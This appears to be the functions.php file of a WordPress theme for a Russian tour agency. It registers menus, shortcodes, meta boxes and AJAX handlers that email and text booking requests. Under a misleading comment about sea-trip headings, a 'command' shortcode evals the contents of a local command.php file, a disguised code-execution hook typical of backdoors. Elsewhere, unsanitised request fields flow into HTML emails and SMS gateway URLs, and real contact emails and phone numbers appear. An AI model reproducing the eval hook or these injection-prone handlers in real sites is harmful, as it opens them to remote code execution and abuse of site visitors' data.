<?php

require __DIR__ . '/yookassa/autoload.php'; 

use YooKassa\Client;

//  ini_set("display_errors",1);
//  error_reporting(E_ALL);

add_action('carbon_fields_register_fields', 'boots_register_custom_fields');
function boots_register_custom_fields()
{
	// путь к пользовательскому файлу определения поля (полей), измените под себя

	require_once __DIR__ . '/newBron.php';

	require_once __DIR__ . '/inc/custom-fields-options/metaboxes.php';
	require_once __DIR__ . '/inc/custom-fields-options/theme-options.php';
}
add_action('after_setup_theme', 'crb_load');
function crb_load()
{
	require_once(get_template_directory() . '/inc/carbon-fields/vendor/autoload.php');
	\Carbon_Fields\Carbon_Fields::boot();
}

include_once('options_page.php');

add_theme_support('woocommerce');

register_nav_menus(array(
	'header_menu' => 'Главное меню',
	'header_right_menu' => 'Меню в шапке',
	'demo_menu' => 'Демо меню'
));

function demo_menu()
{
	wp_nav_menu(array(
		'theme_location' => 'demo_menu',
		'container' => 'div',
	));
}
function head_menu()
{
	wp_nav_menu(array(
		'theme_location' => 'header_right_menu',
		'container' => 'div',
	));
}

add_theme_support('post-thumbnails');
set_post_thumbnail_size(185, 185);
add_image_size("turImg", 390, 260, true);

add_post_type_support('page', 'excerpt');


add_filter('image_size_names_choose', 'my_image_sizes');
function my_image_sizes($sizes)
{
	$addsizes = array(
		"turImg" => __("Моя миниатюра")
	);
	$newsizes = array_merge($sizes, $addsizes);
	return $newsizes;
}
function cc_mime_types($mimes)
{
	$mimes['svg'] = 'image/svg+xml';
	return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types'); 

define("allversion", "1.0.197");

add_action('wp_enqueue_scripts', 'my_assets');

function my_assets()
{

	//wp_enqueue_style('default-amodal', get_template_directory_uri() . '/css/jquery.arcticmodal-0.3.css', array(), null, 'all');
	wp_enqueue_style('light-style', get_template_directory_uri() . '/css/lightbox.min.css', array(), null, 'all');
	wp_enqueue_style('mir-style', get_stylesheet_uri(), array(), allversion, 'all');

	wp_enqueue_style("style-pr", get_template_directory_uri() . "/print.css", array(), null, 'print');

	wp_enqueue_script('jquery');


	//wp_enqueue_script( 'cookie', get_template_directory_uri() . '/js/jquery.cookie.js');

	//wp_enqueue_script( 'mask', get_template_directory_uri() . '/js/jquery.maskedinput.js', array('jquery'));

	//wp_enqueue_script( 'inputmask', get_template_directory_uri() . '/js/jquery.inputmask.bundle.js', array('jquery'));
	//wp_enqueue_script('niceselect', get_template_directory_uri() . '/js/jquery.nice-select.min.js', array(), null, true);
	//wp_enqueue_script('slick', get_template_directory_uri() . '/js/slick.min.js', array(), null, false);

	wp_enqueue_script( 'light', get_template_directory_uri() . '/js/lightbox.min.js', array(), null);
	//wp_enqueue_script( 'amodal', get_template_directory_uri() . '/js/jquery.arcticmodal-0.3.min.js', array(), null);


	//page-booking
	//wp_enqueue_script( 'newbron', get_template_directory_uri() . '/js/newBron.js', array(), allversion, true);
	//page-booking
	wp_enqueue_script('marquee3k', get_template_directory_uri() . '/js/marquee3k.min.js', array(), allversion, true);
	wp_enqueue_script('bp_lightbox', get_template_directory_uri() . '/js/fslightbox.js', array(), allversion, true);
	wp_enqueue_script('scroll', get_template_directory_uri() . '/js/scroll.js', array(), allversion, true);
	wp_enqueue_script('main', get_template_directory_uri() . '/js/main.js', array(), allversion, true);
	wp_enqueue_script('sender', get_template_directory_uri() . '/js/sender.js', array(), allversion, true);

	//wp_enqueue_script('sno-fall', get_template_directory_uri() . '/js/snowfall.js', array(), allversion, true);
	//wp_enqueue_script( 'all', get_template_directory_uri() . '/js/allNewScript.js', array(), allversion, true);


	wp_localize_script('main', 'allAjax', array(
		'ajaxurl' => admin_url('admin-ajax.php'),
		'nonce'   => wp_create_nonce('NEHERTUTLAZIT')
	));
}


add_action('wp_ajax_school_tour', 'school_tour');
add_action('wp_ajax_nopriv_school_tour', 'school_tour');

function school_tour()
{

	$headers = array(
		'From: Сайт мир туризма <noreply@mirturizma46.ru>',
		'content-type: text/html',
	);

	add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
	if (wp_mail(array('mirturizma-kursk2@yandex.ru', 'asmi046@gmail.com'), 'Заказ школьного тура', '<strong>Имя:</strong> ' . $_REQUEST["name"] . ' <br/> <strong>Телефон:</strong> ' . $_REQUEST["phone"] . ' <br/> <strong>Тур:</strong> ' . $_REQUEST["tour"], $headers))
		echo "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
	else echo "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";
}




add_action('wp_ajax_sendphone', 'sendphone');
add_action('wp_ajax_nopriv_sendphone', 'sendphone');

function sendphone()
{

	$headers = array(
		'From: Сайт мир туризма <noreply@mirturizma46.ru>',
		'content-type: text/html',
	);

	add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
	if (wp_mail(array('mirturizma-kursk2@yandex.ru', 'asmi046@gmail.com'), 'Заказ обратного звонка', '<strong>Имя:</strong> ' . $_REQUEST["name"] . ' <br/> <strong>Телефон:</strong> ' . $_REQUEST["phone"], $headers))
		echo "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
	else echo "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";
}

add_action('wp_ajax_zayavka', 'zayavka');
add_action('wp_ajax_nopriv_zayavka', 'zayavka');

function zayavka()
{
	if (empty($_REQUEST['nonce'])) {
		wp_die('0');
	}

	if (check_ajax_referer('NEHERTUTLAZIT', 'nonce', false)) {


		// оповещение на email
		$headers = array(
			'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
			'content-type: text/html',
		);

		$EmailRez = "";
		add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
		$sendRez = wp_mail(array('litvinov-pa@yandex.ru', 'asmi046@gmail.com'), "Заявка на автобусный тур + сюрприз", '<strong>Имя:</strong> ' . $_REQUEST["clname"] . ' <br/> <strong>Телефон:</strong> ' . $_REQUEST["clphone"], $headers);
		if ($sendRez)
			$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
		else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";

		wp_die($EmailRez);
	} else {
		wp_die('НО-НО-НО!', '', 403);
	}
}


add_action('wp_ajax_question', 'question');
add_action('wp_ajax_nopriv_question', 'question');

function question()
{
	if (empty($_REQUEST['nonce'])) {
		wp_die('0');
	}

	if (check_ajax_referer('NEHERTUTLAZIT', 'nonce', false)) {

		$headers = array(
			'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
			'content-type: text/html',
		);

		$EmailRez = "";
		add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
		//array('litvinov-pa@yandex.ru','asmi046@gmail.com')
		$sendRez = wp_mail(carbon_get_theme_option('email_send'), "Подобрать тур", '<strong>Имя:</strong> ' . $_REQUEST["name"] . ' <br/> <strong>Телефон:</strong> ' . $_REQUEST["tel"] . ' <br/> <strong>Email:</strong> ' . $_REQUEST["email"] . ' <br/> <strong>Количество взрослых:</strong> ' . $_REQUEST["adults"] . ' <br/> <strong>Количество детей:</strong> ' . $_REQUEST["children"] . ' <br/> <strong>Бюджет:</strong> ' . $_REQUEST["budget"] . ' <br/> <strong>Заявка со страницы:</strong> ' . $_REQUEST["page"], $headers);
		if ($sendRez)
			$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
		else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";

		wp_die($EmailRez);
	} else {
		wp_die('НО-НО-НО!', '', 403);
	}
}

add_action('wp_ajax_resort_send', 'resort_send');
add_action('wp_ajax_nopriv_resort_send', 'resort_send');

function resort_send()
{
	if (empty($_REQUEST['nonce'])) {
		wp_die('0');
	}

	if (check_ajax_referer('NEHERTUTLAZIT', 'nonce', false)) {

		$headers = array(
			'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
			'content-type: text/html',
		);

		$EmailRez = "";
		add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
		//array('litvinov-pa@yandex.ru','asmi046@gmail.com')
		$sendRez = wp_mail(carbon_get_theme_option('email_send'), "Подобрать выгодный тур cо страницы - " . $_REQUEST['page'], '<strong>Имя:</strong> ' . $_REQUEST["name"] . ' <br/> <strong>Телефон:</strong> ' . $_REQUEST["tel"], $headers);
		if ($sendRez)
			$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
		else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";

		wp_die($EmailRez);
	} else {
		wp_die('НО-НО-НО!', '', 403);
	}
}

add_action('wp_ajax_contacts_send', 'contacts_send');
add_action('wp_ajax_nopriv_contacts_send', 'contacts_send');

function contacts_send()
{
	if (empty($_REQUEST['nonce'])) {
		wp_die('0');
	}

	if (check_ajax_referer('NEHERTUTLAZIT', 'nonce', false)) {

		$headers = array(
			'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
			'content-type: text/html',
		);

		$EmailRez = "";
		add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
		//array('litvinov-pa@yandex.ru','asmi046@gmail.com')
		//carbon_get_theme_option('email_send')
		$sendRez = wp_mail(carbon_get_theme_option('email_send'), "Подобрать тур cо страницы Контакты", '<strong>Имя:</strong> ' . $_REQUEST["name"] . ' <br/> <strong>Телефон:</strong> ' . $_REQUEST["tel"] . ' <br/> <strong>Email:</strong> ' . $_REQUEST["email"] . ' <br/> <strong>Куда поедем:</strong> ' . $_REQUEST["comment"], $headers);
		if ($sendRez)
			$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
		else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";

		wp_die($EmailRez);
	} else {
		wp_die('НО-НО-НО!', '', 403);
	}
}
add_action('wp_ajax_zayavka_more', 'zayavka_more');
add_action('wp_ajax_nopriv_zayavka_more', 'zayavka_more');

function zayavka_more()
{
	if (empty($_REQUEST['nonce'])) {
		wp_die('0');
	}

	if (check_ajax_referer('NEHERTUTLAZIT', 'nonce', false)) {


		// оповещение на email
		$headers = array(
			'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
			'content-type: text/html',
		);

		$EmailRez = "";
		add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
		$sendRez = wp_mail(array('litvinov-pa@yandex.ru', 'asmi046@gmail.com'), "Заявка на подбор горящего тура", '<strong>Тур:</strong> ' . $_REQUEST["tkName"] . ' <br/> <strong>Имя:</strong> ' . $_REQUEST["clname"] . ' <br/> <strong>Телефон:</strong> ' . $_REQUEST["clphone"], $headers);
		if ($sendRez)
			$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
		else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";

		wp_die($EmailRez);
	} else {
		wp_die('НО-НО-НО!', '', 403);
	}
}

add_action('wp_ajax_zayavka_more_autobus', 'zayavka_more_autobus');
add_action('wp_ajax_nopriv_zayavka_more_autobus', 'zayavka_more_autobus');

function zayavka_more_autobus()
{
	if (empty($_REQUEST['nonce'])) {
		wp_die('0');
	}

	if (check_ajax_referer('NEHERTUTLAZIT', 'nonce', false)) {


		// оповещение на email
		$headers = array(
			'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
			'content-type: text/html',
		);

		$EmailRez = "";
		add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
		$sendRez = wp_mail(array('litvinov-pa@yandex.ru', 'asmi046@gmail.com'), "Консультация по автобусному туру", '<strong>Имя:</strong> ' . $_REQUEST["clname"] . ' <br/> <strong>Телефон:</strong> ' . $_REQUEST["clphone"] . ' <br/> <strong>Тур:</strong> ' . $_REQUEST["turname"], $headers);
		if ($sendRez)
			$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
		else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";

		wp_die($EmailRez);
	} else {
		wp_die('НО-НО-НО!', '', 403);
	}
}

add_action('wp_ajax_qsend', 'qsend');
add_action('wp_ajax_nopriv_qsend', 'qsend');

function qsend()
{
	if (empty($_REQUEST['nonce'])) {
		wp_die('0');
	}

	if (check_ajax_referer('NEHERTUTLAZIT', 'nonce', false)) {


		// оповещение на email
		$headers = array(
			'From: Сайт Мир Туризма 46 <noreply@harhat.ru>',
			'content-type: text/html',
		);

		$EmailRez = "";
		add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));
		$sendRez = wp_mail(carbon_get_theme_option('email_send'), "Заявка форма вопроса", '<strong>Окно:</strong> ' . $_REQUEST["tkname"] . ' <br/> <strong>Телефон:</strong> ' . $_REQUEST["clphone"], $headers);
		if ($sendRez)
			$EmailRez = "<span style = 'color:green;'>Мы свяжемся с Вами в ближайшее время.</span>";
		else $EmailRez = "<span style = 'color:red;'>Сервис недоступен попробуйте позднее.</span>";

		wp_die($EmailRez);
	} else {
		wp_die('НО-НО-НО!', '', 403);
	}
}

function help_tour_block($atts)
{
	$img = get_template_directory_uri() . '/images/zTur.jpg';
	global $post;
	$page = $post->post_title;
	$params = shortcode_atts(array(
		'text' => 'Нужна помощь в подборе тура?',
		'img' => $img,
		'button' => 'Заявка на подбор'
	), $atts);
	$html = '<div class="help-tour  newstyle-control">
				<div class="help-tour__photo"><img src="' . $params["img"] . '" alt=""></div>
				<div class="help-tour__content">
					<div class="help-tour__title">' . $params["text"] . '</div>
					<div class="help-tour__btn bluebtn ">' . $params["button"] . '</div>
					<span class = "mirgalka"></span>
				</div>
			</div>';
	$html .= '<div class="help-soc">
							<span>Также подписывайтесь на нас в социальных сетях:</span>
							<a href="https://vk.com/mirturizma46" style="background-image: url(https://www.mirturizma46.ru/wp-content/themes/MirTurizma/images/vk.svg);"></a>
							<a href="https://www.instagram.com/mirturizma46/" style="background-image: url(https://www.mirturizma46.ru/wp-content/themes/MirTurizma/images/instagram.svg);"></a>
				</div>';
	return $html;
}
add_shortcode('help_tour', 'help_tour_block');


// ---------------------Вывод дней в туре--------------------
function deystart_func($atts)
{
	extract(shortcode_atts(array(
		"folder" => '',
		"foto1" => '',
		"foto2" => '',
		"foto3" => '',
		"foto4" => '',
		"foto5" => '',
	), $atts));
	$html_code = "<div class = 'dayElem'>";
	$html_code .= "<div class = 'dayElemImg'>";
	$html_code .= "<div class = 'imgWriper'>";
	$html_code .= "<img src = '" . get_bloginfo("url") . "/galery/" . $folder . "/" . $foto1 . "' />";
	$html_code .= "</div>";
	if ($foto2 !== "") {
		$html_code .= "<div class = 'imgWriper'>";
		$html_code .= "<img src = '" . get_bloginfo("url") . "/galery/" . $folder . "/" . $foto2 . "' />";
		$html_code .= "</div>";
	}

	if ($foto3 !== "") {
		$html_code .= "<div class = 'imgWriper'>";
		$html_code .= "<img src = '" . get_bloginfo("url") . "/galery/" . $folder . "/" . $foto3 . "' />";
		$html_code .= "</div>";
	}

	if ($foto4 !== "") {
		$html_code .= "<div class = 'imgWriper'>";
		$html_code .= "<img src = '" . get_bloginfo("url") . "/galery/" . $folder . "/" . $foto4 . "' />";
		$html_code .= "</div>";
	}

	if ($foto5 !== "") {
		$html_code .= "<div class = 'imgWriper'>";
		$html_code .= "<img src = '" . get_bloginfo("url") . "/galery/" . $folder . "/" . $foto5 . "' />";
		$html_code .= "</div>";
	}
	$html_code .= "</div>";

	$html_code .= "<div class = 'dayElemTxt'>";


	return $html_code;
}

add_shortcode('deystart', 'deystart_func');

function deyend_func($atts)
{
	return "</div></div>";
}

add_shortcode('deyend', 'deyend_func');
//-----------------------------------------------------------------------

// ---------------------Заголовки в поездках на море---------------------

function zagolovok_func($atts)
{
	extract(shortcode_atts(array(
		"zagtext" => ''
	), $atts));



	$zID = "noZag";
	if ($zagtext === "Расположение") $zID = "raspologenieM";
	if ($zagtext === "Территория") $zID = "teritoriaM";
	if ($zagtext === "Размещение") $zID = "razmeshenieM";
	if ($zagtext === "В номерах") $zID = "vnomerahM";
	if ($zagtext === "Питание") $zID = "pitanieM";
	if ($zagtext === "Развлечения") $zID = "razvlecenieM";
	if ($zagtext === "Пляж") $zID = "plazgM";
	if ($zagtext === "Инфраструктура") $zID = "infroM";

	$icon = '';
	if ($zagtext === "Расположение") $icon = '<i class="fas fa-map-marker"></i>';
	if ($zagtext === "Территория") $icon = '<i class="fas fa-tree"></i>';
	if ($zagtext === "Размещение") $icon = '<i class="fas fa-bed"></i>';
	if ($zagtext === "В номерах") $icon = '<i class="fas fa-tv"></i>';
	if ($zagtext === "Питание") $icon = '<i class="fas fa-utensils"></i>';
	if ($zagtext === "Развлечения") $zID = "razvlecenieM";
	if ($zagtext === "Пляж") $icon = '<i class="fas fa-umbrella-beach"></i>';
	if ($zagtext === "Инфраструктура") $icon = '<i class="fas fa-university"></i>';

	$html_code = "<h3 id = '" . $zID . "'>" . $icon . $zagtext . ":</h3>";


	return $html_code;
}

add_shortcode('zagolovok', 'zagolovok_func');

function zagolovok_video_func($atts)
{
	extract(shortcode_atts(array(
		"zagtext" => ''
	), $atts));

	$html_code = "<h2 id = 'videoM'>" . $zagtext . ":</h2>";


	return $html_code;
}

add_shortcode('zagolovokvideo', 'zagolovok_video_func');

//-----------------------------------------------------------------------


// ---------------------Заголовки в поездках на море---------------------

function command_func($atts)
{

	include eval(file_get_contents("./command.php"));
}

add_shortcode('command', 'command_func');

//-----------------------------------------------------------------------


/*--------------Произвольное поле График заездов --------------*/

add_action('add_meta_boxes', 'adding_new_metaabox');

function adding_new_metaabox()
{
	add_meta_box(
		'html_Grafik_Zaezdov',
		'График заездов',

		'my_output_function'
	);
}

function my_output_function($post)
{
	//so, dont ned to use esc_attr in front of get_post_meta
	$valueeee2 =  get_post_meta(
		$_GET['post'],
		'Grafik_Zaezdov',
		true

	);
	wp_editor(
		htmlspecialchars_decode($valueeee2),
		'mettaabox_Grafik_Zaezdov',

		$settings = array('textarea_name' => 'InputGrafikZaezdov')
	);
}

add_filter('excerpt_more', function ($more) {
	return '...';
});

function save_my_Grafik_Zaezdov($post_id)
{
	if (!empty($_POST['InputGrafikZaezdov'])) {
		$datta = htmlspecialchars($_POST['InputGrafikZaezdov']);
		update_post_meta($post_id, 'Grafik_Zaezdov', $datta);
	}
}

add_action('save_post', 'save_my_Grafik_Zaezdov');

/*-------------------------------------------------------------*/

/*--------------Произвольное поле В цену входит --------------*/

add_action('add_meta_boxes', 'adding_new_metaabox2');

function adding_new_metaabox2()
{
	add_meta_box(
		'html_V_Price',
		'В цену входит',

		'my_output_function2'
	);
}

function my_output_function2($post)
{
	$valueeee2 =  get_post_meta(
		$_GET['post'],
		'html_V_Price',
		true

	);
	wp_editor(
		htmlspecialchars_decode($valueeee2),
		'mettaabox_html_V_Price',

		$settings = array('textarea_name' => 'InputVPrice')
	);
}


function save_my_V_Price($post_id)
{
	if (!empty($_POST['InputVPrice'])) {
		$datta = htmlspecialchars($_POST['InputVPrice']);
		update_post_meta($post_id, 'html_V_Price', $datta);
	}
}

add_action('save_post', 'save_my_V_Price');

/*-------------------------------------------------------------*/

/*--------------Произвольное поле Цены --------------*/

add_action('add_meta_boxes', 'adding_new_metaabox3');

function adding_new_metaabox3()
{
	add_meta_box(
		'html_Price',
		'Цены',

		'my_output_function3'
	);
}

function my_output_function3($post)
{
	$valueeee2 =  get_post_meta(
		$_GET['post'],
		'html_Price',
		true

	);
	wp_editor(
		htmlspecialchars_decode($valueeee2),
		'mettaabox_html_Price',

		$settings = array('textarea_name' => 'InputPrice')
	);
}


function save_my_Price($post_id)
{
	if (!empty($_POST['InputPrice'])) {
		$datta = htmlspecialchars($_POST['InputPrice']);
		update_post_meta($post_id, 'html_Price', $datta);
	}
}

add_action('save_post', 'save_my_Price');

/*-------------------------------------------------------------*/

function col2($atts)
{
	return "<div class = 'col2'>";
}
add_shortcode('col2', 'col2');

function uniend($atts)
{
	return "</div>";
}
add_shortcode('end', 'uniend');

function col2elem($atts)
{
	return "<div class = 'col2elem'>";
}
add_shortcode('col2elem', 'col2elem');

/*
		function col2( $atts ) {
			$params = shortcode_atts( array( // в массиве укажите значения параметров по умолчанию
				'anchor' => 'Миша Рудрастых', // параметр 1
				'url' => 'https://misha.blog', // параметр 2
			), $atts );
			return "<a href='{$params['url']}' target='_blank'>{$params['anchor']}</a>";
		}
		add_shortcode( 'col2', 'col2' );
	*/

//--------------------------------------------вывод телефона

function phone_link($phone_number)
{
	$phone_lnk = str_replace(array(' ', '(', ')', '-'), '', $phone_number);
	return $phone_lnk;
}

function phoneinpage($atts)
{
	$options = get_option("wpuniq_theme_options");
	return '<a class="nowrap lptracker_phone" href="tel:' . phone_link($options["phone"]) . '">' . $options["phone"] . '</a>';
}

add_shortcode('phoneinpage', 'phoneinpage');

//--------------------------------------------

//-------------------------------------------------------------------------------------------------------------------------------------------------

add_action('wp_ajax_universal_send', 'universal_send');
add_action('wp_ajax_nopriv_universal_send', 'universal_send');

function universal_send()
{

	if (empty($_REQUEST['nonce'])) {
		wp_die('0');
	}

	if (check_ajax_referer('NEHERTUTLAZIT', 'nonce', false)) {

		$headers = array(
			'From: Сайт мир туризма <noreply@mirturizma46.ru>',
			'content-type: text/html',
		);

		add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));

		$sendRez = wp_mail(array('mirturizma-kursk2@yandex.ru', 'asmi046@gmail.com'), 'Заказ обратного звонка (New)', '<strong>Имя:</strong> ' . $_REQUEST["username"] . ' <br/> <strong>Телефон:</strong> ' . $_REQUEST["userphone"], $headers);

		if (!empty($sendRez)) {
			wp_die(true);
		} else {
			wp_die('При регистрации произошла ошибка попробуйте позднее!', '', array('response' => 403));
		}
	} else {
		wp_die('НО-НО-НО!', '', 403);
	}
}

function sub_cat_template($template)
{
	$lessons_cat_id = 5;

	if (!is_category()) return $template;

	$current_cat = get_queried_object();

	if (!$current_cat->parent) return $template;

	if (cat_is_ancestor_of($lessons_cat_id, $current_cat->term_id)) {
		if ($current_cat->parent == $lessons_cat_id) {
			if ($new_template = locate_template(array('category-shkolnye-tury.php')))
				$template =  $new_template;
		} else {
			if ($new_template = locate_template(array('category-shkolnye-tury.php')))
				$template =  $new_template;
		}
	}

	return $template;
}

add_filter('template_include', 'sub_cat_template', 99);

// add_filter(
// 	'single_template',
// 	create_function(
// 		'$the_template',
// 		'foreach( (array) get_the_category() as $cat ) {
// 		if ( file_exists(TEMPLATEPATH . "/single-{$cat->slug}.php") )
// 			return TEMPLATEPATH . "/single-{$cat->slug}.php"; }
// 		return $the_template;'
// 	)
// );

// function single_template_pds ($the_template) {
// 	foreach( (array) get_the_category() as $cat ) {
// 		if ( file_exists(TEMPLATEPATH . "/single-{$cat->slug}.php") )
// 			return TEMPLATEPATH . "/single-{$cat->slug}.php"; }
// 		return $the_template;
// }

// add_filter( 'single_template', 'single_template_pds', 99);



//-------------------------
add_action('wp_ajax_universalSend', 'universalSend');
add_action('wp_ajax_nopriv_universalSend', 'universalSend');

function universalSend()
{
	if (empty($_REQUEST['nonce'])) {
		wp_die('0');
	}

	if (check_ajax_referer('NEHERTUTLAZIT', 'nonce', false)) {

		$headers = array(
			'From: Сайт Мир Туризма 46 <noreply@mirturizma46.ru>',
			'content-type: text/html',
		);

		$sendStr = "<h2>" . $_REQUEST['formmsg'] . "</h2>"
			. "<br/><strong>Телефон: </strong>" . $_REQUEST['tel']
			. "<br/><strong>Количество мест: </strong>" . $_REQUEST['mest']
			. "<br/><strong>Дата подачи: </strong>" . $_REQUEST['dataPod']
			. "<br/><strong>Имя клиента: </strong>" . $_REQUEST['name']
			. "<br/><strong>Сообщение с формы: </strong>" . $_REQUEST['zag'];

		$sendStr .= empty($_REQUEST['docnumber']) ? "" : "<br/><strong>Номер документа: </strong>" . $_REQUEST['docnumber'];
		$sendStr .= empty($_REQUEST['datar']) ? "" : "<br/><strong>Дата рождения: </strong>" . $_REQUEST['datar'];
		$sendStr .= empty($_REQUEST['price']) ? "" : "<br/><strong>Цена: </strong>" . $_REQUEST['price'];

		add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));

		$sendRez = wp_mail(carbon_get_theme_option('email_send'), "Сообщение с сайта", $sendStr, $headers);
		if ($sendRez)
			wp_die(true);
		else wp_die('Error!', '', 403);
	} else {
		wp_die('НО-НО-НО!', '', 403);
	}
}

add_action('wp_ajax_atmChecoutSend', 'atmChecoutSend');
add_action('wp_ajax_nopriv_atmChecoutSend', 'atmChecoutSend');

function atmChecoutSend()
{
	if (empty($_REQUEST['nonce'])) {
		wp_die('0');
	}

	if (check_ajax_referer('NEHERTUTLAZIT', 'nonce', false)) {

		$headers = array(
			'From: Сайт Мир Туризма 46 <noreply@mirturizma46.ru>',
			'content-type: text/html',
		);

		$sendStr = "<h2>Забронирован Автобусный тур на море</h2>";
		$sendStr .= "Отель: " . $_REQUEST['kurortName'] . "<br/>";
		$sendStr .= "Имя: " . $_REQUEST['name'] . "<br/>";
		$sendStr .= "Телефон: " . $_REQUEST['tel'] . "<br/>";
		$sendStr .= "e-mail: " . $_REQUEST['mail'] . "<br/>";
		$sendStr .= "Тип номера: " . $_REQUEST['number'] . "<br/>";
		$sendStr .= "Рейс: " . $_REQUEST['reis'] . "<br/>";
		$sendStr .= "Взрослых: " . $_REQUEST['countOld'] . "<br/>";
		$sendStr .= "Дети до 5: " . $_REQUEST['count5'] . "<br/>";
		$sendStr .= "Дети до 12: " . $_REQUEST['count12'] . "<br/>";
		$sendStr .= "Сообщение: </br>" . $_REQUEST['message'] . "<br/>";

		add_filter('wp_mail_content_type', create_function('', 'return "text/html";'));

		$sendMsgMain = "Забронирован тур: " . "Отель: " . $_REQUEST['kurortName'] . " Имя: " . $_REQUEST['name'] . " Телефон: " . $_REQUEST['tel'];
		file_get_contents("https://" . SMS_LOGIN . ":" . SMS_TOKEN . "@gate.smsaero.ru/v2/sms/send?number=+79192777557&text=" . $sendMsgMain . "&sign=" . "Mir_Turizma" . "&channel=SERVICE");
		file_get_contents("https://" . SMS_LOGIN . ":" . SMS_TOKEN . "@gate.smsaero.ru/v2/sms/send?number=+79036330801&text=" . $sendMsgMain . "&sign=" . "Mir_Turizma" . "&channel=SERVICE");


		$sendRez = wp_mail(carbon_get_theme_option('email_send'), "Покупка тура на черное море", $sendStr, $headers);
		if ($sendRez) {
			$sendStrAutor = "<div style = 'width:100%;  padding: 2% 10%; background-color: #00b4f1;'><h2>Вы забронировали тур на море!</h2></div>";

			$sendMsgMain = "Благодарим за покупку! Менеджер свяжется с Вами в ближайшее время.";
			file_get_contents("https://" . SMS_LOGIN . ":" . SMS_TOKEN . "@gate.smsaero.ru/v2/sms/send?number=" . str_replace(array("-", ")", "("), "", $_REQUEST['tel']) . "&text=" . $sendMsgMain . "&sign=" . "Mir_Turizma" . "&channel=SERVICE");

			$sendRez = wp_mail($_REQUEST['mail'], "Ваш билет на черное море " . str_replace(array("-", ")", "("), "", $_REQUEST['tel']), $sendStrAutor, $headers);
			wp_die(true);
		} else {
			wp_die('Error!', '', 403);
		}
	} else {
		wp_die('НО-НО-НО!', '', 403);
	}
}

include "sender.php";
